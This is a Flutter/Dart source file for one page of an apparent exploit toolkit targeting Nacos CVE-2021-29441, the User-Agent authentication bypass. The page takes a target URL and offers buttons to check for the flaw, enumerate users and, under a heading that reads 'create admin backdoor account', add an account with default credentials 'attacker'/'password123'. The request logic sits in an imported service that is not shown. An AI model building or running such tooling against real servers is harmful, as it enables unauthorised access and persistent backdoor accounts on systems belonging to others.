import 'package:flutter/material.dart';
import '../../exp/vulhub/misc_http_exp_service.dart';
import '../../theme/app_theme.dart';
import '_vulhub_page_helpers.dart';

class NacosExpPage extends StatelessWidget {
  const NacosExpPage({super.key});
  @override
  Widget build(BuildContext context) => Scaffold(
        backgroundColor: AppColors.bgDark,
        appBar: AppBar(
          backgroundColor: AppColors.bgElevated, elevation: 0,
          leading: IconButton(icon: const Icon(Icons.arrow_back), onPressed: () => Navigator.of(context).pop()),
          title: Row(children: [
            const Icon(Icons.cloud, color: AppColors.primary), const SizedBox(width: 8),
            Text('Nacos CVE-2021-29441 User-Agent 认证绕过',
                style: AppTextStyles.heading(size: 14, color: AppColors.primary)),
          ]),
        ),
        body: Padding(padding: const EdgeInsets.all(24),
          child: Column(crossAxisAlignment: CrossAxisAlignment.stretch, children: [
            vulhubInfoCard(Icons.cloud, 'Nacos CVE-2021-29441', 'User-Agent: Nacos-Server 绕过认证，枚举/创建用户（< 1.4.1）'),
            const SizedBox(height: 16),
            const Expanded(child: _NacosCard()),
          ]),
        ),
      );
}

class _NacosCard extends StatefulWidget {
  const _NacosCard();
  @override
  State<_NacosCard> createState() => _NacosCardState();
}

class _NacosCardState extends State<_NacosCard> {
  final _urlCtrl = TextEditingController();
  final _userCtrl = TextEditingController(text: 'attacker');
  final _passCtrl = TextEditingController(text: 'password123');
  final _timeoutCtrl = TextEditingController();
  final _logScroll = ScrollController();
  String _log = ''; bool _running = false;

  void _log_(String l) {
    setState(() {
      final lines = _log.isEmpty ? <String>[] : _log.split('\n');
      lines.add(l); if (lines.length > 500) lines.removeRange(0, lines.length - 500);
      _log = lines.join('\n');
    });
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScroll.hasClients) _logScroll.animateTo(_logScroll.position.maxScrollExtent, duration: const Duration(milliseconds: 100), curve: Curves.easeOut);
    });
  }

  NacosExpService _svc() => NacosExpService(baseUrl: _urlCtrl.text.trim(), timeout: Duration(seconds: int.tryParse(_timeoutCtrl.text.trim()) ?? 10));

  Future<void> _check() async {
    if (_urlCtrl.text.trim().isEmpty) { _log_('[!] 请输入目标 URL'); return; }
    setState(() => _running = true); _log_('[*] 检测 CVE-2021-29441 认证绕过...');
    try { final r = await _svc().check(); _log_(r.vulnerable ? '[+] ${r.vulnName}: ${r.detail}' : '[-] 未检测到漏洞'); }
    catch (e) { _log_('[!] 异常: $e'); }
    finally { if (mounted) setState(() => _running = false); }
  }

  Future<void> _listUsers() async {
    if (_urlCtrl.text.trim().isEmpty) { _log_('[!] 请输入目标 URL'); return; }
    setState(() => _running = true); _log_('[*] 枚举用户列表...');
    try {
      final out = await _svc().listUsers();
      _log_(out != null && out.isNotEmpty ? '[+] 用户列表:\n$out' : '[-] 未获取到用户列表');
    } catch (e) { _log_('[!] 异常: $e'); }
    finally { if (mounted) setState(() => _running = false); }
  }

  Future<void> _createUser() async {
    if (_urlCtrl.text.trim().isEmpty) { _log_('[!] 请输入目标 URL'); return; }
    final user = _userCtrl.text.trim(); final pass = _passCtrl.text.trim();
    if (user.isEmpty || pass.isEmpty) { _log_('[!] 请输入用户名和密码'); return; }
    setState(() => _running = true); _log_('[*] 创建用户: $user');
    try {
      final out = await _svc().createUser(user, pass);
      _log_(out != null ? '[+] 响应: $out' : '[-] 创建失败');
    } catch (e) { _log_('[!] 异常: $e'); }
    finally { if (mounted) setState(() => _running = false); }
  }

  @override
  void dispose() { _urlCtrl.dispose(); _userCtrl.dispose(); _passCtrl.dispose(); _timeoutCtrl.dispose(); _logScroll.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) => VulhubExpCardShell(
    running: _running, log: _log, logScroll: _logScroll,
    onClearLog: () => setState(() => _log = ''),
    leftPanel: SingleChildScrollView(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      vSecTitle('目标配置'),
      vTf(_urlCtrl, '目标 URL', 'http://target.com:8848/'),
      const SizedBox(height: 8),
      vTf(_timeoutCtrl, '超时(s)', '10', type: TextInputType.number),
      const SizedBox(height: 8),
      Row(children: [
        vBtn('检测漏洞', _running ? null : _check),
        const SizedBox(width: 8),
        vBtn('枚举用户', _running ? null : _listUsers),
      ]),
      const SizedBox(height: 16),
      vSecTitle('创建管理员后门账号'),
      vTf(_userCtrl, '用户名', 'attacker'),
      const SizedBox(height: 8),
      vTf(_passCtrl, '密码', 'password123'),
      const SizedBox(height: 8),
      vBtn('创建用户', _running ? null : _createUser),
    ])),
  );
}
